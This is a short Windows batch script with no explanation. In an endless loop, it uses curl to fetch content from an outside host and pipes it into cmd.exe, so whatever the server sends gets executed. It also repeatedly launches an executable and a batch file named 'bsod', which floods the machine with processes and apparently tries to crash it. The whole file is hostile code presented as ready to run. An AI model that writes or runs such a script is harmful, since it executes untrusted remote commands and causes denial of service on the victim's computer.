:loop
start curl.exe -sN http://rick.jachan.dev/ | cmd.exe
ping localhost -n 3 >nul
start sup.exe
start bsod.bat
goto loop